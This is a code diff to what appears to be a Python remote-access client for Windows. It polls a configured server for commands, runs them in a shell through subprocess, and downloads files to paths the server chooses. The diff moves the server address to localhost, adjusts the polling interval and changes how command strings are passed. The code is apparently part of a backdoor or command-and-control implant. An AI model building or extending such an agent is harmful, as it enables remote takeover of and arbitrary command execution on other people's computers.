@@ -10,11 +10,10 @@ import winreg
 from urllib.parse import urlparse
 from uuid import getnode as get_mac
 
-SERVER_URI = "http://192.168.178.41:8000"
+SERVER_URI = "http://127.0.0.1:8000"
 SERVER_TIMEOUT = 10
 
-CHECK_INTERVAL = 10
-COMMAND_INTERVAL = 2
+COMMAND_INTERVAL = 30
 SUBPROCESS_TIMEOUT = 10
 CONNECTION_ERROR_INTERVAL = 10
 
@@ -22,12 +21,16 @@ DEFAULT_HEADERS = {
     'Content-Type': 'application/json'
 }
 
+SHELL_COMMAND = 1
+MODULE_COMMAND = 1
+
 
 def threaded(func):
     def wrapper(*_args, **kwargs):
         t = threading.Thread(target=func, args=_args)
         t.start()
         return
+
     return wrapper
 
 
@@ -101,8 +104,7 @@ class Client:
 
     def run_command(self, cmd, **kwargs):
         # internal commands
-
-        if cmd.get('command_type') == 1:
+        if cmd.get('command_type') == MODULE_COMMAND:
             print('[D] got internal command: %s' % cmd)
             try:
                 data = json.loads(cmd.get('command'))
@@ -116,7 +118,7 @@ class Client:
                 self.http_download(cmd.get('uuid'), data.get('file_url'), data.get('save_path'))
             return
 
-        _command = cmd.get('command').split(' ')
+        _command = cmd.get('command', None)
         try:
             print('[D] Running command "%s"' % _command)
             out = subprocess.check_output(_command, timeout=SUBPROCESS_TIMEOUT, **kwargs)
